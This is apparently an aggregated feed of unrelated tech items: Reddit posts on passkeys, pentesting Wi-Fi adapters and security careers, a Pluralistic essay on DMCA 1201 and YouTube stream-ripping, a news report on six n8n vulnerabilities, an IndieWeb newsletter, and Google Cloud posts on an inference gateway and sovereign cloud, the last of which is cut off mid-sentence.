They can be intercepted, stolen, and phished. Phishing resistance is the most important element of security. Private keys are not shared, so they can’t be intercepted or stolen from a service. 2 NIST (the US National Institute of Standards and Technology) defines three Authentication Assurance Levels (AALs), which are requirements for the strength of an authentication process: AAL1 = single-factor using approved cryptography; AAL2 = phishing-resistant, replay-resistant multi-factor using approved cryptography (public/private key or OTP); AAL3 = multi-factor, phishing-resistant, cryptographic hardware with a non-exportable private key. Passkeys must include user verification for AAL2 or AAL3. Synced passkeys must be stored in an account with AAL2 authentication to qualify for AAL2. 3 Passkeys combine two factors into one login step when the website or app requires user verification (face scan, fingerprint, passcode, pattern, or PIN). 4 Passkeys only qualify for AAL3 when bound to platforms with FIPS-validated secure hardware and proper configuration, otherwise they are AAL2. 5 A passkey on a mobile phone can be used on other devices by scanning a QR code. However, Apple and Android passkeys are almost always synced, not device-bound. 6 U2F (FIDO Universal Second Factor) is a second factor only. It requires another factor, usually a password. 7 Whether or not passkeys are protected by special security hardware depends on the credential manager. Android, Windows, and Apple protect passkeys with hardware security modules (HSMs). Other password managers don’t. Cloud storage of passkeys is often protected by HSMs. 8 Synced passkeys and passwords are protected by the security of the sync fabric . In other words, the ways you can access your Apple, Google, Microsoft, or other password manager account determines the security of the credentials stored in that account. This applies to password managers that are self-hosted or use local storage, even if the credentials are not synced. 9 Once you choose an ecosystem in which to store passkeys and passwords, they may be tied to that ecosystem. For example, if you choose Google Password Manager, your credentials can be used from Android devices and any other device running the Google Chrome browser. Ditto for Apple devices or a device running the iCloud app. The same applies to standalone password managers. Switching to a new ecosystem can be difficult. You can often export and import passwords, but passkeys are harder to move. This is changing as the FIDO Credential Exchange Protocol (CXP) is adopted more widely. 10 The risk of SIM swap is low and can be further mitigated by enabling SIM protection at carrier. 11 Email accounts are the primary target of attackers. A weak password and no 2FA leaves the account and email-based 2FA vulnerable. Email accounts should be protected by a strong password and 2FA, or a passkey, but they rarely are. submitted by /u/JimTheEarthling [link] [comments]",

I thought about buying the same wifi adapter again but I want a more powerful option so to speak and also one that has good controllers, stability and range.I've been searching and I think I found three good options on Amazon ALFA AC1900 WiFi Adapter – 1900Mbps 802.11ac Long Range USB 3.0 Wi-Fi Network Adapter with 4 External 5dBi Dual Band Antennas, TAA Compliant Alfa AWUS036ACHM 802.11ac WiFi Range Boost Adaptador USB 【New version type C USB WiFi】 ALFA AWUS036ACH Long-range AC1200 dual-band wireless Wi-Fi adapter with 2 external 5dBi antennas - 2.4GHz 300Mbps/5GHz 867Mbps - 802.11ac and A, B, G, All three have almost the same style, the main visual difference is the antennas my questions are: Which of the 3 should be or is better for pentesting, injection, stability, etc? Do the extra antennas of each model (1) (2) (4) have any advantages? Are there WiFi adapters that have 2 or more PHYSICAL radios? Are there better WiFi adapters on the market for more or less the same price? Some of these adapters have a version that integrates 6ghz Wi-Fi.

From the outside, it seems like: • Buying is mostly top-down • CISOs / security leadership drive decisions • Partners and resellers matter a lot • Bottom-up, developer-led adoption is rarer (but maybe I’m wrong) I’d love a reality check from folks in the field: • Who typically initiates a purchase? • Does bottom-up usage meaningfully influence buying? • What does the usual buying process look like (POCs, audits, budget cycles)? • How important are partners vs direct vendor relationships? • What makes a new security vendor credible vs ignored? just trying to avoid bringing the wrong mental models from the AI/dev world.

I live in Florida, and I started working as a cybersecurity engineer intern in late 2023 for one of the top 3 defense companies, and after I graduated in May 2025, I accepted a return offer for 90k with good benefits. I have a great team, manager, and WLB, but I can't help but feel empty and wanting more. This is a job that I have essentially been doing since I started working here, and the thing that has stopped me from throwing my resume out there is that I am currently in a cybersecurity engineering position, which is almost impossible as a new grad to obtain, and the job market is trash right now. I have a 1 on 1 with my manager on Monday, and I was planning on bringing up some of my concerns with him about this. During lunch last week, he was asking if I would be interested in doing a more cyber software based role, and I have mentioned to him that I was going to reach out to have a L4 teach me about reverse engineering at work since the company offers hours for training and mentoring. I currently have my sec+ and my job is paying for my MSCS from Georgia Tech, and any certs that I want, and I am trying my best to take advantage of these opportunities, but it currently feels like I have golden handcuffs and I won't really be able to find another similar position without having a massive downgrade in pay or title. Any advice is appreciated! I'm not sure where to really go from here because I know that people would probably kill to be in my position, and it sounds a bit selfish to want more after all that I have been given. I am not solely looking for a pay increase, but I would like work that is more interesting than what i do now. My thinking is that it is best to wait out the job market a bit and see whats out there once I finish my masters in 3 years, since by then I should be a level 2 with 3 YOE. submitted by /u/Effective_Item_1617 [link] [comments]",

I thought I've been part of this community for years but apparently it was a different community with cybersecurity in the name, I know right. Anyway, for the members with ISC2.org access, here is the source. I'm not sure sure if you need to login or not but it does count as 1 CPE. https://www.isc2.org/Insights/2025/06/cybersecurity-hiring-trends-study The report advises hiring managers to \"hire for attitude, train for aptitude\" and to build resilient teams, these organizations need to implement the followingt: Re-evaluate Job Descriptions: Remove \"nice-to-have\" advanced certifications from \"must-have\" lists to attract capable entry-level talent. Look Beyond IT: 25% of managers are successfully hiring talent from non-technical backgrounds who bring diverse perspectives. These non-IT industries usually require indepth thought but specific processes to adhere to state, federal regulations. Leverage Foundational Certifications: Do not focus solely on higher level certifications like CISA, or CISSP, but rather CySA+, PenTest+ SSCP, and Certified in Cybersecurity (CC) rather than senior-level credentials. Thoughts? My summary doesnt really do it justice. It needs to be read in its entirety to be truly appreciated. submitted by /u/scooter950 [link] [comments]",

Especially if you’re not very good at frisbee golf and end up throwing it deep into the woods every time. Turns out I do a lot of extra hiking for every round of disc golf I play! 😅 Apple x Retro Gaming : I don’t do much modern gaming these days, but I still like to play some of the classics from time to time. Retro emulators on the iPhone/iPad are a great way to quickly enjoy some of these titles on the go. ( This one in particular) Blogging x ANYTHING !: Last but not least, there’s my blogging interest! Turns out you can (and should ) blog about literally anything. So that’s what I do.

Key capabilities include: • Analysis of APT-based Linux images (RPM support in progress) • Identification of executed packages and associated services • JSON-based output for automation and security tooling • Improved visibility for supply-chain security and runtime risk assessment This approach helps bridge the gap between static SBOMs and real-world system behavior, supporting stronger DevSecOps practices and more accurate vulnerability management.

    "title": "Pluralistic: End of the line for video essays (07 Feb 2026)",
    "summary": "Today's links End of the line for video essays: America's worst copyright law keeps getting even worse. Hey look at this: Delights to delectate. Object permanence: Payphone phaseout; Nvidia sock-puppets; Love picking; Fake locksmiths. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. End of the line for video essays (permalink) What if there was a way for a business to transform any conduct it disliked into a felony, harnessing the power of the state to threaten anyone who acted in a way that displeased the company with a long prison sentence and six-figure fines? Surprise! That actually exists! It's called Section 1201 of the Digital Millennium Copyright Act, the \"anticircumvention\" clause, which establishes five-year sentences and $500k fines for anyone who bypasses an \"effective access control\" for a copyrighted work. Let's unpack that: every digital product has a \"copyrighted work\" at its core, because software is copyrighted. Digital systems are intrinsically very flexible: just overwrite, augment, or delete part of the software that powers the device or product, and you change how the product works. You can alter your browser to block ads; or alter your Android phone to run a privacy-respecting OS like Graphene; or alter your printer to accept generic ink, rather than checking each cartridge to confirm that it's the original manufacturer's product. However, if the device is designed to prevent this – if it has an \"access control\" that restricts your ability to change the software – then DMCA 1201 makes those modifications into crimes. The act of providing someone with a tool to change how their own property works (\"trafficking in circumvention devices\") is a felony. But there's a tiny saving grace here: for DMCA 1201 to kick in, the \"access control\" must be \"effective.\" What's \"effective?\" There's the rub: no one knows. The penalties for getting crosswise with DMCA 1201 are so grotendous that very few people have tried to litigate any of its contours. Whenever the issue comes up, defendants settle, or fold, or disappear. Despite the fact that DMCA 1201 has been with us for more than a quarter of a century, and despite the fact that the activities it restricts are so far-reaching, there's precious little case law clarifying Congress's vague statutory language. When it comes to \"effectiveness\" in access controls, the jurisprudence is especially thin. As far as I know, there's just one case that addressed the issue, and boy was it a weird one. Back in 2000, a \"colorful\" guy named Johnny Deep founded a Napster-alike service that piggybacked on the AOL Instant Messenger network. He called his service \"Aimster.\" When AOL threatened him with a trademark suit, he claimed that Aimster was his daughter Amiee's AOL handle, and that the service was named for her. Then he changed the service's name to Madster, claiming that it was also named after his daughter. At the time, a lot of people assumed he was BSing, but I just found his obituary and it turns out his daughter's name was, indeed, \"Amiee (Madeline) Deep\": https://www.timesunion.com/news/article/Madster-creator-Cohoes-native-who-fought-record-11033636.php Aimster was one of the many services that the record industry tried to shut down, both by filing suit against the company and by flooding it with takedown notices demanding that individual tracks be removed. Deep responded by \"encoding\" all of the track names on his network in pig-Latin. Then he claimed that by \"decoding\" the files (by moving the last letter of the track name to the first position), the record industry was \"bypassing an effective access control for a copyrighted work\" and thus violating DMCA 1201: https://abcnews.go.com/Entertainment/story?id=108454&amp;page=1 The court didn't buy this. The judge ruled that pig Latin isn't an \"effective access control.\" Since then, we've known that at least some access controls aren't \"effective\" but we haven't had any clarity on where \"effectiveness\" starts. After all, there's a certain circularity to the whole idea of \"effective\" access controls: if a rival engineer can figure out how to get around an access control, can we really call it \"effective?\" Surely, the fact that someone figured out how to circumvent your access control is proof that it's not effective (at least when it comes to that person). All this may strike you as weird inside baseball, and that's not entirely wrong, but there's one unresolved \"effectiveness\" question that has some very high stakes indeed: is Youtube's javascript-based obfuscation an \"effective access control?\" Youtube, of course, is the internet's monopoly video platform, with a commanding majority of video streams. It was acquired by Google in 2006 for $1.65b. At the time, the service was hemorrhaging money and mired in brutal litigation, but it had one virtue that made it worth nine figures: people liked it. Specifically, people liked it in a way they didn't like Google Video, which was one of the many, many, many failed internally developed Google products that tanked, and was replaced by a product developed by a company that Google bought, because Google sucks at developing products. They're not Willy Wonka's idea factory – they're Rich Uncle Pennybags, buying up other kids' toys: https://www.theatlantic.com/ideas/archive/2023/02/google-ai-chatbots-microsoft-bing-chatgpt/673052/ Google operationalized Youtube and built it up to the world's most structurally important video platform. Along the way, Google added some javascript that was intended to block people from \"downloading\" its videos. I put \"downloading\" in scare-quotes because \"streaming\" is a consensus hallucination: there is no way for your computer to display a video that resides on a distant server without downloading it – the internet is not made up of a cunning series of paper-towel rolls and mirrors that convey photons to your screen without sending you the bits that make up the file. \"Streaming\" is just \"downloading\" with the \"save file\" button removed. In this case, the \"save file\" button is removed by some javascript on every Youtube page. This isn't hard to bypass: there are dozens of \"stream-ripping\" sites that let you save any video that's accessible on Youtube. I use these all the time – indeed, I used one last week to gank the video of my speech in Ottawa so I could upload it to my own Youtube channel: https://www.youtube.com/watch?v=iZxbaCNIwg8 (As well as the Internet Archive, natch): https://archive.org/details/disenshittification-nation Now, all of this violates Youtube's terms of service, which means that someone who downloads a stream for an otherwise lawful purpose (like I did) is still hypothetically at risk of being punished by Google. We're relying on Google to be reasonable about all this, which, admittedly, isn't the best bet, historically. But at least the field of people who can attack us is limited to this one company. That's good, because there's zillions of people who rely on stream-rippers, and many of them are Youtube's most popular creators. Youtube singlehandedly revived the form of the \"video essay,\" popularizing it in many guises, from \"reaction videos\" to full-fledged, in-depth documentaries that make extensive use of clips to illuminate, dispute, and expand on the messages of other Youtube videos. These kinds of videos are allowed under US copyright law. American copyright law has a broad set of limitation and exceptions, which include \"fair use,\" an expansive set of affirmative rights to access and use copyrighted works, even against the wishes of the copyright's proprietor. As the Supreme Court stated in Eldred, the only way copyright (a government-backed restriction on who can say certain words) can be reconciled with the First Amendment (a ban on government restrictions on speech) is through fair use, the \"escape valve\" for free expression embedded in copyright: https://en.wikipedia.org/wiki/Eldred_v._Ashcroft Which is to say that including clips from a video you're criticizing in your own video is canonical fair use. What else is fair use? Well, it's \"fact intensive,\" which is a lawyer's way of saying, \"it depends.\" One thing that is 100% true, though, is that fair use is not limited to the \"four factors\" enumerated in the statute and anyone who claims otherwise has no idea what they're talking about and can be safely ignored: https://pluralistic.net/2024/06/27/nuke-first/#ask-questions-never Now, fair use or not, there are plenty of people who get angry about their videos being clipped for critical treatment in other videos, because lots of people hate being criticized. This is precisely why fair use exists: if you had to secure someone's permission before you were allowed to criticize them, critical speech would be limited to takedowns of stoics and masochists. This means that the subjects of video essays can't rely on copyright to silence their critics. They also can't use the fact that those critics violated Youtube's terms of service by clipping their videos, because only Youtube has standing to ask a court to uphold its terms of service, and Youtube has (wisely) steered clear of embroiling itself in fights between critics and the people they criticize. But that hasn't stopped the subjects of criticism from seeking legal avenues to silence their critics. In a case called Cordova v. Huneault, the proprietor of \"Denver Metro Audits\" is suing the proprietor of \"Frauditor Troll Channel\" for clipping the former's videos for \"reaction videos.\" One of the plaintiff's claims here is that the defendant violated Section 1201 of the DMCA by saving videos from Youtube. They argue that Youtube's javascript obfuscator (a \"rolling cipher\") is an \"effective access control\" under the statute. Magistrate Judge Virginia K DeMarchi (Northern District of California) agreed with the plaintiff: https://torrentfreak.com/images/Cordova-v.-Huneault-25-cv-04685-VKD-Order-on-Motion-to-Dismiss.pdf As Torrentfreak reports, this ruling \"gives creators who want to sue rivals an option to sue for more than just simple copyright infringement\": https://torrentfreak.com/ripping-clips-for-youtube-reaction-videos-can-violate-the-dmca-court-rules/ Remember, DMCA 1201 applies whether or not you infringe someone's copyright. It is a blanket prohibition on the circumvention of any \"effective access control\" for any copyrighted work, even when no one's rights are being violated. It's a way to transform otherwise lawful conduct into a felony. It's what Jay Freeman calls \"Felony contempt of business model.\" If the higher court upholds this magistrate judge's ruling, then all clipping becomes a crime, and the subjects of criticism will have a ready tool to silence any critic. This obliterates fair use, wipes it off the statute-book. It welds shut copyright's escape valve for free expression. Now, it's true that the US Copyright Office holds hearings every three years where it grants exemptions to DMCA 1201, and it has indeed granted an exemption for ripping video for critical and educational purposes. But this process is deceptive! The exemptions that the Copyright Office grants are \"use exemptions\" – they allow you to \"make the use.\" However, they are not \"tools exemptions\" – they do not give you permission to acquire or share the tool needed to make the use: https://pluralistic.net/2024/10/28/mcbroken/#my-milkshake-brings-all-the-lawyers-to-the-yard Which means that you are allowed to rip a stream, but you're not allowed to use a stream-ripping service. If Youtube's rolling cipher is an \"effective access control\" then all of those stream-ripping services are wildly illegal, felonies carrying a five-year sentence and a $500k fine for a first offense under DMCA 1201. Under the US Copyright Office's exemption process, if you want to make a reaction video, then you, personally must create your own stream-ripper. You are not allowed to discuss how to do this with anyone else, and you can't share your stream-ripper with anyone else, and if you do, you've committed a felony. So this is a catastrophic ruling. If it stands, it will make the production of video essays, reaction videos, and other critical videos into a legal minefield, by giving everyone whose video is clipped and criticized a means to threaten their critics with long prison sentences, fair use be damned. The only people who will safely be able to make this kind of critical video are skilled programmers who can personally defeat Youtube's \"rolling cipher.\" And unlike claims about stream-ripping violating Youtube's terms of service – which can only be brought by Youtube – DMCA 1201 claims can be brought by anyone whose videos get clipped and criticized. Is Youtube's rolling cipher an \"effective access control?\" Well, I don't know how to bypass it, but there are dozens of services that have independently figured out how to get around it. That seems like good evidence that the access control is not \"effective.\" When the DMCA was enacted in 1998, this is exactly the kind of thing experts warned would happen: https://pluralistic.net/2025/05/13/ctrl-ctrl-ctrl/#free-dmitry And here we are, more than a quarter-century later, living in the prison of lawmakers' reckless disregard for evidence and expertise, a world where criticism can be converted into a felony.

    "summary": "Hey r/netsec , I built an open-source tool called crypto-scanner that scans codebases for cryptographic usage and flags algorithms vulnerable to quantum computing attacks. What it does: Scans source code (Python, JS/TS, Java, Go, Rust, C/C++, and more) Parses X.509 certificates and config files (YAML, JSON, ENV, INI) 4-tier risk classification: Critical (quantum-vulnerable), High (deprecated), Medium (monitor), Low (adequate) Outputs JSON for CI/CD automation or styled HTML reports Works as a pre-commit hook or GitHub Action Why I built it: NIST finalized post-quantum cryptography standards in 2024, and organizations need to start inventorying their cryptographic assets before migrating. Most teams have no idea what algorithms are actually running in their codebases. This tool gives you that visibility. Install: pip install crypto-scanner crypto-scanner scan /path/to/project --html --output report.html GitHub: https://github.com/mbennett-labs/crypto-scanner PyPI: https://pypi.org/project/crypto-scanner/ MIT licensed.

    "title": "Six more vulnerabilities found in n8n automation platform",
    "summary": "Six more vulnerabilities have been discovered in the n8n workflow platform used for building LLM-powered agents to connect business processes. Four of the six are rated as critical, carrying CVSS severity scores of 9.4. “These vulnerabilities span multiple attack classes, from remote code execution and command injection to arbitrary file access and cross-site scripting, all targeting a platform that is frequently deployed with access to secrets, credentials, internal APIs, and business-critical logic,” noted Amit Genkin , a security researchers at Israel-based cloud security provider Upwind, who blogged about the vulnerabilities this week . Johannes Ullrich , dean of research at the SANS Institute, said the vulnerabilities affect how n8n sandboxes the processes created by different users, and how the host is protected from users with access to n8n. “This is less of an issue for a single user system,” he said in an email, “but n8n is often installed in shared environments. Given the number and severity of the vulnerabilities, it is fair to assume that this is more or less just the ‘tip of the iceberg’. At this point, multi user n8n deployments should be treated with care.” The discovery is the second major revelation of issues in the n8n platform this year. Four weeks ago, researchers at Cyera published details of a critical vulnerability , after it had been patched, that would allow unauthenticated attackers to completely take over n8n deployments. Also last month, it was learned that threat actors are targeting n8n by planting malicious packages on the npm registry that claim to be legitimate n8n add-ons. CSOs with n8n in their environments and developers using the platform should update to the latest version of the application to close the newly-found holes. The vulnerabilities are: CVE-2026-21893 , a command injection hole in the community edition of n8n. An unauthenticated user with administration permission could execute arbitrary system commands on the n8n host. “The risk is amplified by the trust typically placed in community extensions,” Upwinds said in its commentary, “making this a high-impact attack path that directly bridges application-level functionality with host-level execution. It carries a CVSS vulnerability score of 9.4; CVE-2026-25049 , which carries a CVSS score of 9.4. An authenticated user with permission to create or modify workflows could abuse crafted expressions in workflow parameters to trigger unintended system command execution on the host running n8n. “Because workflow expressions are a core and commonly used feature in n8n, this flaw significantly lowers the barrier to exploitation and enables full compromise of the underlying host,” commented Upwind in its blog; CVE-2026-25052 , which carries a CVSS score of 9.4. A vulnerability in the file access controls allows authenticated users with permission to create or modify workflows to read sensitive files from the n8n host system. This can be exploited to obtain critical configuration data and user credentials, leading to complete account takeover of any user on the instance; CVE-2026-25053 , which carries a CVSS score of 9.4. This is a vulnerability in the Git node that allows execution of system commands or arbitrary file access; CVE-2026-25051 , a cross-site scripting vulnerability in the handling of webhook responses and related HTTP endpoints. It carries a CVSS score of 8.5. Under certain conditions, the n8n Content Security Policy (CSP) sandbox protection intended to isolate HTML responses may not be applied correctly. An authenticated user with permission to create or modify workflows could abuse this to execute malicious scripts with same-origin privileges when other users interact with the crafted workflow. This could lead to session hijacking and account takeover. CVE-2025-61917 , which carries a CVSS score of 7.7. This is an information disclosure vulnerability caused by unsafe buffer allocation in n8n task runners. During an interview, Moshe Hassan , Upwind’s vice-president of research and innovation, estimated that 83% of his firm’s customers use the n8n platform. But, he added, less than 25% use it in production and/or may have it exposed to the web. The rest, he said, are testing it. However, he said those who are evaluating the platform could be at risk if the users enter identity tokens for cloud platforms such as AWS and others as part of their testing. And the fact that large numbers of developers are testing the latest AI-related applications makes it hard for security pros to contain the blast radius of potential vulnerabilities in IT environments, he added. Generally, to contain vulnerabilities, CSOs have to understand the business logic and data flow of any applications in their environments, Hassan noted. However, risk can be lowered through network segregation, he said, and in addition, engineering should be allowed to create sandboxes for thorough testing of applications before they go into production.",

For all the reasons this is true, truly owning your content, your identity, and your place on the web has got to be one of the most important. You are unique . So why try to shove yourself into a character-limited box? Or reduce your accomplishments to boring, pre-canned form fields? Instead, build something that shows who you really are. Something that could even outlive you . Somethings are easier said than done. With site-building, things really can be done as easy as they are said. There’s tons of website building options and self-hosting resources. Hell , it’s so easy these days you may find yourself hopping from platform to platform just for a change of scenery! Once you got your site up, it’s time to get writin’ . Or y’know, keep tinkerin’ with the site until you’re happy with the way it looks and feels. Completely up to you! You could publish a blogroll , get involved in a blogging challenge , or just write about the little things . It’s this diversity of thought, content and style that make the IndieWeb such a fun place to be and explore . ⚠️ WARNING: Here’s something to be aware of for those of us who write AI-free content. Small Web Finds and Features Alright folks, you’re in for a real treat today! Here’s some truly awesome new sites I’ve discovered recently! wavelight had me vibing in liminal darkness Lose yourself in ominous.net ’s excellent writing Make a cool ‘moji at the Kaomoji Cool Club Take a stroll through Lichendust’s Garden If you’re going to doom scroll, try doing it here Matt’s Blog looks great and has a lot of interesting content as well Journals & Recaps Having a personal blog can mean posting personal stuff! I really enjoy seeing people’s journal entries, weekly recaps and similar types of posts. This type of post generally focuses more on the self and the site, and less on others / external links . Though there’s no reason it can’t have both! Here’s a sampling of journal & recap posts I’ve encountered recently. A January 2026 Recap from SAINTHOOD The last 1 × 4⅓ weeks from tlohde The January 2026 entry within the microfeed from Harley Some Site Updates (January 2026) from Antony The January 2026 Summary from Joel The weeknotes (a while back) from Karen The week notes from Katie A Weeklog (from Aug ‘25) by Vae The Monthly Rewind: January 2026 from Stephanie Fediverse Some say “ Big Tech’s biggest enemy is Mastodon ”. There’s some truth here, but that doesn’t mean Mastodon is impervious to corporate takeover. So let’s all pitch in to help build a truly open, free, and community-like space for all! To help get you started , here’s some thoughts on how to maximize your own engagement within the Fediverse . Just remember , when you’re here, you’ve got a job to do . Cybersecurity Let’s keep it simple. The failures keep coming for AI , Apple’s Platform Security doc has a new coat of paint, and the State of the Art in Red Team is whatever you believe it to be. Done ! Thanks for reading Scrolls ! Back to the real (icy) world that is February in Northern VA 🥶.",

    "title": "How we cut Vertex AI latency by 35% with GKE Inference Gateway",
    "summary": "As generative AI moves from experimentation to production, platform engineers face a universal challenge for inference serving: you need low latency, high throughput, and manageable costs. It is a difficult balance. Traffic patterns vary wildly, from complex coding tasks that require processing huge amounts of data, to quick, chatty conversations that demand instant replies. Standard infrastructure often struggles to handle both efficiently. Our solution: To solve this, the Vertex AI engineering team adopted the GKE Inference Gateway . Built on the standard Kubernetes Gateway API, Inference Gateway solves the scale problem by adding two critical layers of intelligence: Load-aware routing: It scrapes real-time metrics (like KV Cache utilization) directly from the model server's Prometheus endpoints to route requests to the pod that can serve them fastest. Content-aware routing: It inspects request prefixes and routes to the pod that already has that context in its KV cache, avoiding expensive re-computation. By migrating production workloads to this architecture, Vertex AI proves that this dual-layer intelligence is the key to unlocking performance at scale. Here’s how Vertex AI optimized its serving stack and how you can apply these same patterns to your own platform to unlock strict tail-latency guarantees, maximize cache efficiency to lower cost-per-token, and eliminate the engineering overhead of building custom schedulers. The results: Validated at production scale By placing GKE Inference Gateway in front of the Vertex AI model servers, we achieved significant gains in both speed and efficiency compared to standard load balancing approaches. These results were validated on production traffic across diverse AI workloads, ranging from context-heavy coding agents to high-throughput conversational models. 35% faster responses: Vertex AI reduced Time to First Token (TTFT) latency by over 35% for Qwen3-Coder by using GKE Inference Gateway. 2x better tail latency: For bursty chat workloads, Vertex AI improved Time to First Token (TTFT) P95 latency by 2x (52%) for Deepseek V3.1 by using GKE Inference Gateway. Doubled efficiency: By leveraging the gateway’s prefix-caching awareness, Vertex AI doubled its prefix cache hit rate (from 35% to 70%) by adopting GKE Inference Gateway. Deep dive: Two patterns for high-performance serving Building a production-grade inference router is deceptively complex because AI traffic isn't a single profile. At Vertex AI, we found that our workloads fell into two distinct traffic shapes, each requiring a different optimization strategy: The context-heavy workload (e.g., coding agents): These requests involve massive context windows (like analyzing a whole codebase) that create sustained compute pressure. The bottleneck here is re-computation overhead . The bursty workload (e.g., chat): These are unpredictable, stochastic spikes of short queries. The bottleneck here is queue congestion . To handle both traffic profiles simultaneously, here are two specific engineering challenges Vertex AI solved using GKE Inference Gateway. 1. Tuning multi-objective load balancing A standard round-robin load balancer doesn't know which GPU holds the cached KV pairs for a specific prompt. This is particularly inefficient for 'context-heavy' workloads, where a cache miss means re-processing massive inputs from scratch. However, routing strictly for cache affinity can be dangerous; if everyone requests the same popular document, you create a node that gets overwhelmed while others sit idle. The solution: Multi-objective tuning in GKE Inference Gateway uses a configurable scorer that balances conflicting signals. During the rollout of their new chat model, we here on the Vertex team tuned the weights for prefix:queue:kv-utilization. By shifting the ratio from a default 3:3:2 to 3:5:2 (prioritizing queue depth slightly higher), we forced the scheduler to bypass \"hot\" nodes even if they had a cache hit. This configuration change immediately smoothed out traffic distribution while maintaining the high efficiency—doubling our prefix cache hit rate from 35% to 70%. 2. Managing queue depth for bursty traffic Inference platforms often struggle with variable load, especially from sudden concurrent bursts. Without protection, these requests can saturate a model server, leading to resource contention that affects everyone in the queue. The solution: Instead of letting these requests hit the model server directly, GKE Inference Gateway enforces admission control at the ingress layer. By managing the queue upstream, the system ensures that individual pods are never resource-starved. The data proves the value: while median latency remained stable, the P95 latency improvement of 52% shows that the gateway successfully absorbed the variance that typically plagues AI applications during heavy load. What this means for platform builders Here’s our lesson: you don't need to reinvent the scheduler. Instead of maintaining custom infrastructure, you can use the GKE Inference Gateway. This gives you access to a scheduler proven by Google’s own internal workloads, ensuring you have robust protection against saturation without the maintenance overhead. Ready to get started?

    "title": "Delivering a secure, open, and sovereign digital world",
    "summary": "The global conversation about our digital future goes beyond technology; it’s about architecting a prosperous, secure, and resilient economy where the digital services we rely on every day — from banking to healthcare to public administration — are built on a foundation of trust and operate according to local regulations. At Google Cloud, we believe that achieving this vision shouldn't require compromises. That’s why we designed our Sovereign Cloud portfolio — consisting of Google Cloud Data Boundary, Google Cloud Dedicated, and Google Cloud Air-Gapped — to provide the industry's most comprehensive and flexible options to meet your unique needs. We believe that you can drive innovation without compromising functionality. Today, we are expanding on that promise for governments, businesses, and citizens across the world. Our commitment is built on five key pillars: investing in local economies through infrastructure and workforce development; enabling digital resilience via rigorous technical and legal controls; empowering customers to control access to their unencrypted data; ensuring an open digital future by supporting open-source software and eliminating lock-in; and actively supporting global cybersecurity and regulatory frameworks. Google Cloud's Sovereign Cloud commitments. Foundation of economic growth Digital sovereignty is fueled by cloud services, yet it is equally dependent on a foundational commitment to the nations we serve. We demonstrate this by fostering local innovation, creating jobs, and having local entities operating under local law across many parts of the world. Over the past few months, we have accelerated this commitment worldwide: Asia-Pacific : We support national agendas like India’s Viksit Bharat and Malaysia’s Ekonomi MADANI framework with multi-billion dollar investments, including new cloud regions in Thailand and Malaysia , and AI partnerships in Singapore . We also launched the TalayLink and Dhivaru subsea cables to significantly boost digital resilience and connectivity across the Indian Ocean and Asia-Pacific. Europe : Today, we operate 13 Cloud regions spanning Europe, from Finland to Spain. This investment includes a new region in Sweden and our new Sovereign Cloud Hub in Germany , complementing our existing cybersecurity hubs in Dublin, Malaga, and Munich. We understand the importance of local oversight for local operations. That’s why our European datacenter operations and their boards are overseen by European boards operating under local law and comprising European nationals who are based in Europe . We have established dedicated public sector entities in Germany and the U.K. and have an established European Advisory Board that serves as an important feedback channel and critical voice, helping ensure our products and services meet European requirements. Latin America : We’re strengthening regional AI innovation by deploying local Tensor Processing Units (TPUs) and bringing Gemini on-premises in Brazil. In Chile, we solidified the country's role as a digital gateway by commencing the Humboldt Cable — the first direct subsea link between South America and Asia-Pacific. These investments are backed by our Capacita+ program, committing to train 200,000 people in generative AI. Middle East and Africa : In the Middle East, we are strengthening sovereign infrastructure with a partnership in Turkey , and recently launched phase two of the Kuwait National Skilling Initiative to train government employees in AI and cybersecurity. We announced a strategic initiative to support the United Arab Emirates as a leader in cybersecurity innovation and education by establishing a center of excellence in Abu Dhabi. In Africa, we established the continent's first direct fiber link to Australia with the Umoja cable , and announced a broader skilling initiative providing Gemini Advanced to students across African nations. North America : In the U.S., we are making substantial long-term investments in infrastructure and workforce development, including the AI Works initiative to boost AI skills development and economic growth. In Canada, we are upskilling more than 2 million people in AI and expanding our Toronto engineering hub, a critical center for global AI talent. Assurance of operational continuity Society relies on the continuous operation of the services provided by Google Cloud’s customers. We prioritize security and digital sovereignty to keep these vital systems running and protected from external threats. Google Cloud complies with key EU cybersecurity regulations, such as NIS2 and DORA . We support customer compliance efforts with robust contractual commitments and additional security offerings, including Google Security Operations and Mandiant Consulting. We back this technical resilience with clear legal protocols: Should Google receive an order from a national government to suspend or terminate the provision of Google Cloud’s operations provided from any country, we will seek to limit, modify, or object to any such order using all available legal avenues. As part of our commitment to partnering with local service providers to build local solutions, customers don’t have to contract with Google to take advantage of these offerings. Additionally, in the event that Google becomes unable to operate Google Cloud, where Google Cloud could otherwise be operated by a third party, Google will make arrangements to allow a qualified third party to take on this operational role. And finally, Google will allow qualified entities based outside the United States, that are subject to local law and whose board members are obligated to act in the best interest of those entities, to utilize Google’s code to provision Google Cloud’s products, services, and solutions in their respective territories. The offerings in our Sovereign Cloud portfolio also help you protect your cloud environments. Google Cloud offers a portfolio of survivable solutions that meet a broad range of requirements. These are available today with our Google Cloud Air-Gapped and Google Cloud Dedicated offerings. Google Cloud Air-Gapped doesn’t require connectivity to Google Cloud or the public internet to manage infrastructure, services, APIs, and tooling. Customers may choose to have a third-party partner (instead of Google) serve as the infrastructure operator for Google Cloud Air-Gapped. It is built on industry-leading open-source components and designed to remain disconnected in perpetuity. Because there is no physical connection, Google cannot remotely access or shut down customer workloads running in Google Cloud Air-Gapped. Around the world, organizations including NATO Communication and Information Agency , the German Armed Forces , the U.K. Ministry of Defence , Singapore government agencies , and the U.S. Air Force have selected Google Cloud Air-Gapped for their most secure workloads. Similarly, Google Cloud Dedicated is designed so that the partner fully controls the environment, including the ability to monitor, and, in exceptional circumstances, block software updates, and revert changes made by Google. Google Cloud Dedicated performs a key rotation after the disconnect and Google has no access to this dedicated instance. The solution is designed to prevent Google from any remote access or the ability to shut down customer workloads running in Dedicated instances, and so that the partner can continue to operate for up to 12 months in the unlikely scenario that their Dedicated instance connection to Google is severed. For example, in France, S3NS offers Premi3NS built on Google Cloud Dedicated. S3NS is a standalone entity and PREMI3NS has achieved the SecNumCloud 3.2 qualification from the French National Agency for the Security of Information Systems (ANSSI). Recognized as the most demanding sovereignty, security, and resilience standard in Europe, and one of the most demanding in the world, this certification confirms that the platform meets the highest protection requirements and offers full, auditable control over access to customer data for our local partner. Highly-regulated customers such as Thales, EDF, MGEN, and Qonto are already building on Premi3NS to accelerate their digital transformation. Your data, your control At its core, digital sovereignty is about individuals and their data. Our commitment to you is that you control your information and data. We were the first major cloud 